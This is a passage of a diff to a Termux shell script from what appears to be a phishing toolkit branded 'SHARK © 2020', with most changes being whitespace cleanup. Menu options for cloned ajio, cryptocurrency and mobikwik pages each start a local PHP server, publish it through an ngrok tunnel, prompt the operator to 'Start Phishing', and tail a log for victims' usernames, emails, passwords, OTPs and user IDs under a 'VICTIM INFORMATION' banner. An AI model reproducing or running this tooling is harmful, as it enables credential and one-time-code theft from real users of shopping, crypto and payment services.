+                           tail -f log.txt | grep -e "Username" -e "password" -e "otp"
 
                            break;
-                
+
 		    elif [ $option = 29 ]
 	            then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd ajio/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                        
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
 			   echo
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "username" -e "password"    
+                           echo
+                           tail -f log.txt | grep -e "username" -e "password"
 
                            break;
-			   
+
 	           elif [ $option = 30 ]
 	           then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd cryptocurrency/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spin_shark
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                       
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
-                           echo 
-                           tail -f log.txt | grep -e "email" -e "password"     
+                           echo
+                           tail -f log.txt | grep -e "email" -e "password"
 
                            break;
-                
+
 		  elif [ $option = 31 ]
-	          then               
+	          then
                            cd /data/data/com.termux/files/usr/bin/phs
                            cd mobikwik/
-                           echo 
+                           echo
 			   connection
                            ( sleep 5 ) &> /dev/null & spinner
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 1
-                           echo 
+                           echo
                            (sleep 6) &> /dev/null & spin
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
                            ( sleep 18 ) &> /dev/null & spinner
-                           echo 
+                           echo
 			   tput cnorm
-                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")                          
+                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 			   ( sleep 6 ) &> /dev/null & spinner1
 		           ash
 			   read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m(Ctrl+c) :\e[m ' listner
 			   clear
 			   shark_logo
-			   echo 
-			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
-			   echo 
+			   echo
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"
+			   echo
 			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo
-                           tail -f log.txt | grep -e "userId" -e "otp"     
+                           tail -f log.txt | grep -e "userId" -e "otp"
 
                            break;
-			 
+
 	          elif [ $option = 99 ]
-	          then     
+	          then
 		      echo
-		      exit 
+		      exit
 		      break;
-		      
-                  else 
-		  
+
+                  else
+
 		  echo
 		  echo -e "\e[92m[\e[94m!\e[92m]\e[91m Invalid option Try Again !! \e[m "
 		  sleep 2
 		  fi
                   done
-		  
-		  
+
+
 #####################################################################
 #                                                                   #
 #      simply changing this banner will not make you developer      #
